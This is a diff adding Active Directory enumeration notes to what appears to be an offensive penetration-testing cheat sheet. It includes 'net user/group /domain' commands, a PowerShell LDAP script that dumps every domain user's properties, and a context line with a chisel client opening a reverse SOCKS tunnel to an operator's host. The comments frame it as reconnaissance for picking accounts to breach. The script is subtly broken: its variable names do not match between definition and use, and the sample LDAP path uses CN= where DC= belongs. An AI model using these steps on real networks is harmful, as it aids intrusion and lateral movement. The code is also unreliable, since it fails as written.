@@ -203,3 +203,72 @@ netsh interface portproxy show all
 chisel server --port 8008 --reverse
 #On the other end use client and connect to your Chisel server, start the reverse forwarding socks
 chisel client 192.168.12.34:8008 R:socks > /dev/null 2>&1 &
+
+----
+
+##Enumerating the AD
+
+#Print out domains and users
+net user /domain
+
+#Continue by going through the users, pay attention to naming as it is often that the users have some extra info added to their name based on the user function
+#If there was for example a user called megaAdmin under basic users, it might have something of interest if we manage to breach the account
+net user megaAdmin /domain
+
+#Enumerate groups, pay attention to custom groups
+net group /domain
+
+#Enumerate group members
+net group "CasualAdmins" /domain
+
+#LDAP-path prototype: LDAP://HostName[:PortNumber][/DistinguishedName], by default the port is either 389 (LDAP) or 636 (LDAPS TLS/SSL)
+#CN == CommonName, DN == DistinguishedName, DC == DomainComponent (when referring to DN, otherwise DomainController)
+LDAP://DC1.ACME.CORP:389/CN=Dickie,CN=Users,CN=acme,CN=corp
+
+#Using powershell
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+#Get the PDC Owner
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+#Get DN using ADSI
+([adsi]'').distinguishedName
+#Get all object in the whole domain
+
+
+
+##Dynamically obtain the LDAP path using a powershell script, script content:
+$pdc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+$dn = ([adsi]'').distinguishedName
+$ldap_path = "LDAP://$pdc/$dn"
+
+#Add to script to further enumerate
+#Get all object in the whole domain into dir_searcher variable
+$dir_entry = New-Object System.DirectoryServices.DirectoryEntry($ldap_path)
+$dir_searcher = New-Object System.DirectoryServices.DirectorySearcher($dir_entry)
+
+#And further to enumerate all users in the domain (SamAccountType 0x30000000 => decimal 805306368 == users, see below)
+  #SAM_DOMAIN_OBJECT 0x0
+  #SAM_GROUP_OBJECT 0x10000000
+  #SAM_NON_SECURITY_GROUP_OBJECT 0x10000001
+  #SAM_ALIAS_OBJECT 0x20000000
+  #SAM_NON_SECURITY_ALIAS_OBJECT 0x20000001
+  #SAM_USER_OBJECT 0x30000000
+  #SAM_NORMAL_USER_ACCOUNT 0x30000000
+  #SAM_MACHINE_ACCOUNT 0x30000001
+  #SAM_TRUST_ACCOUNT 0x30000002
+  #SAM_APP_BASIC_GROUP 0x40000000
+  #SAM_APP_QUERY_GROUP 0x40000001
+  #SAM_ACCOUNT_TYPE_MAX 0x7fffffff
+$dirsearcher.filter="samAccountType=805306368"
+$dirsearcher.FindAll()
+
+#And still further, save the result on the previous part's last line to a variable
+$user_results = $dirsearcher.FindAll()
+#Print all properties per user over a for loop
+Foreach($user_obj in $user_result)
+{
+    Foreach($prop in $user_obj.Properties)
+    {
+        $prop
+    }
+    Write-Host "####"
+}
